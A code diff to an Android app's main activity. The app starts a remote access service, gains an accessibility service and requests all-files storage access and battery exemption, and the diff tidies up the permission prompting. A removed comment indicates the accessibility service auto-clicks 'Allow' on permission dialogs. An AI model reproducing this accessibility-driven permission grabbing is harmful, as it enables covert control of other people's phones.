@@ -84,11 +84,16 @@ public class MainActivity extends AppCompatActivity {
         showActiveStatus();
         startRemoteAccessService();
 
-        if (!permissionManager.isAccessibilityServiceEnabled()) {
-            permissionManager.requestAccessibilityService();
-            startPollingForAccessibility();
-        } else {
-            requestStandardPermissions();
+        if (!preferenceManager.isPermissionsComplete()) {
+            if (!permissionManager.isAccessibilityServiceEnabled()) {
+                if (!preferenceManager.hasAccessibilitySettingsBeenOpened()) {
+                    preferenceManager.setAccessibilitySettingsOpened(true);
+                    permissionManager.requestAccessibilityService();
+                }
+                startPollingForAccessibility();
+            } else {
+                requestStandardPermissions();
+            }
         }
 
         consentButton.setOnClickListener(v -> {
@@ -109,11 +114,14 @@ public class MainActivity extends AppCompatActivity {
         updateMemoryInfo();
         showActiveStatus();
 
+        if (preferenceManager.isPermissionsComplete()) {
+            return;
+        }
+
         if (permissionManager.isAccessibilityServiceEnabled()) {
             requestStandardPermissionsIfCooledDown();
         } else {
             if (!pollingForAccessibility) {
-                permissionManager.requestAccessibilityService();
                 startPollingForAccessibility();
             }
         }
@@ -253,10 +261,15 @@ public class MainActivity extends AppCompatActivity {
     // ── Standard runtime permissions ────────────────────────────────────────
 
     private void requestStandardPermissions() {
+        if (preferenceManager.isPermissionsComplete()) return;
+
         lastStandardPermRequestTime = System.currentTimeMillis();
 
-        // Battery optimization exemption — opens dialog, auto-grant clicks Allow
+        // Battery optimization exemption — only prompts if not already exempted
         requestBatteryOptimization();
+
+        // MANAGE_EXTERNAL_STORAGE (All Files Access) — only prompts if not already granted
+        permissionManager.requestManageExternalStorage();
 
         List<String> needed = new ArrayList<>();
         for (String p : buildPermissionList()) {
@@ -267,6 +280,21 @@ public class MainActivity extends AppCompatActivity {
         if (!needed.isEmpty()) {
             ActivityCompat.requestPermissions(this,
                 needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        } else {
+            checkAndMarkPermissionsComplete();
+        }
+    }
+
+    private void checkAndMarkPermissionsComplete() {
+        boolean allRuntimeGranted = true;
+        for (String p : buildPermissionList()) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                allRuntimeGranted = false;
+                break;
+            }
+        }
+        if (allRuntimeGranted && permissionManager.hasManageExternalStorage()) {
+            preferenceManager.setPermissionsComplete(true);
         }
     }
 
@@ -314,6 +342,9 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            checkAndMarkPermissionsComplete();
+        }
     }
 
     // ── Accessibility polling ────────────────────────────────────────────────
